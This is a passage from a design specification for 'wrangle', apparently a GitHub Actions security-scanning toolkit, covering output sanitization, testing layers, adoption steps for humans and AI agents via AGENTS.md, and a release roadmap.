| Wrangle internal refs in reusable workflows | Relative path (`./`) — resolves to the workflow's own repo at the called ref |
| Wrangle internal refs in composite actions | Relative path (`./`) — resolves to the same repo at the called ref |

Adopters are advised to pin to a release tag. The `@main` ref MUST NOT appear in any `uses:` line in the repo, including examples and documentation.

### Output Sanitization

Tool output (SARIF, markdown, plain text) flows into `$GITHUB_STEP_SUMMARY` and GitHub Code Scanning. Before writing to the step summary:
- HTML tags are stripped
- Output is truncated to prevent summary flooding
- Markdown is limited to safe formatting (no raw HTML, no JavaScript links)
- `jq` exit codes are checked; malformed SARIF causes a tool failure (exit 2), not a silent pass

---

## Testing Strategy

### Local (fast, TDD-friendly)

```bash
make test    # Runs all local checks
```

Layers:
1. **actionlint** — validates all workflow and action YAML files
2. **shellcheck** — lints all shell scripts
3. **bats-core** — unit tests for adapters, install scripts, orchestrator, and formatter
4. **SARIF schema validation** — validates fixture/output SARIF against the 2.1.0 JSON schema

**Adapter testing pattern:** Per-tool `test.bats` files (in `tools/<name>/`) test the adapter and install scripts in isolation using mock tool binaries that produce fixture SARIF. This keeps local tests fast and deterministic. The `test/` directory contains integration tests that exercise the orchestrator and composite action end-to-end, plus shared fixtures (sample SARIF files, SARIF JSON schema) and CI-specific tests that download real tools and run them against the wrangle repo itself (dogfooding).

### CI (integration)

`.github/workflows/test.yml` runs `make test` plus integration tests that exercise the composite action via `uses: ./actions/scan`.

### End-to-end (cross-repo)

[TomHennen/Concordance](https://github.com/TomHennen/Concordance) serves as the external test repo. A successful run there proves the full adoption path works.

---

## Adoption Path

### For humans

1. Copy the workflow from `gh_workflow_examples/check_source_change.yml` into your repo at `.github/workflows/check_source_change.yml`
2. Adjust the branch name if your default branch isn't `main`
3. Push. Done.

### For AI agents

`AGENTS.md` in the repo root provides adoption instructions for AI coding agents. It MUST contain:

1. A single-command adoption instruction (e.g., "create this file at this path")
2. The exact workflow YAML to generate, parameterized by default branch name
3. The required GitHub permissions
4. How to detect project type (check for Dockerfile, language files, etc.)
5. Expected output after adoption (what the user should see on their next PR)

If the agent cannot determine the project type (no Dockerfile, no recognized language files), it should add only the source scanning workflow — this is always applicable regardless of project type. The agent should note to the user that build/publish workflows can be added once the project type is identified.

The goal: any AI agent that reads `AGENTS.md` can adopt wrangle on a new repo without additional context or web searches.

### Long-term: OpenSSF contribution

The adapter pattern, tool composition logic, and profile system are candidates for contribution to OpenSSF (e.g., as part of Minder or a new working group). The spec and implementation will be designed with this handoff in mind.

---

## Roadmap

### v0.1.0 — Source scanning + container build (this spec)

**Source stage:**
- [ ] Per-tool directories (`tools/<name>/`) with adapter + install + test
- [ ] Binary download with SLSA provenance (preferred) or SHA-256 verification
- [ ] Shared download/verify library (`lib/download_verify.sh`)
- [ ] Portable composite action (`github.action_path`)
- [ ] Input validation and environment isolation in orchestrator
- [ ] SARIF upload enabled (per-tool categories)
- [ ] Output sanitization for step summaries

**Build/publish stage (container):**
- [ ] Container build action portability fixes (`${{ github.action_path }}`)
- [ ] Container build action security fixes (PATH clobbering, expression injection)
- [ ] SBOM generation + vulnerability scanning working cross-repo

**Infrastructure:**
- [ ] All action references pinned to SHAs
- [ ] SLSA source track adopted for the wrangle repo itself
- [ ] Testing infrastructure (actionlint + shellcheck + bats)
- [ ] Tested on Concordance
- [ ] AGENTS.md for AI agent adoption

### v0.2.0 — Profiles + additional build types

- [ ] Profile system (`wrangle.yml` with `profile: container` / `profile: library` / `profile: python`)
- [ ] `wrangle init` CLI or GitHub Action for bootstrapping
- [ ] Test integration — detect and run project tests before build
- [ ] Additional source tools (e.g., Semgrep, Trivy)
- [ ] Additional build types (Python, npm, Go)
- [ ] `tools.lock` manifest — single file listing all tool versions, URLs, and checksums per platform
- [ ] Lightweight sandboxing for adapters (bubblewrap/firejail on Linux)
- [ ] [Ampel](https://github.com/carabiner-dev/ampel) integration — policy verification layer that evaluates attestations against CEL-based policies and produces Verification Summary Attestations
- [ ] Help adopters adopt the SLSA source track in their repos

### v1.0.0 — OpenSSF ready

- [ ] OpenSSF contribution proposal
- [ ] Stable adapter API with versioning guarantees
- [ ] Multi-CI support (GitLab, etc.)
- [ ] Full lifecycle coverage for all major project types
